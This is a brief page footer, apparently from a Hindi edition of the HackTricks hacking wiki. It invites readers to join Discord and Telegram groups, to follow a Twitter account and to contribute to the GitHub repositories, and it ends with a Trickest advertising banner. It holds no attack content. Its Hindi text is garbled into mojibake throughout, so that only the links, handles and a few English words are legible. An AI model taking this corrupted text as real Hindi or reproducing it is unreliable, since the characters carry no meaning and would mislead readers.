* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдмрдирд╛рдПрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
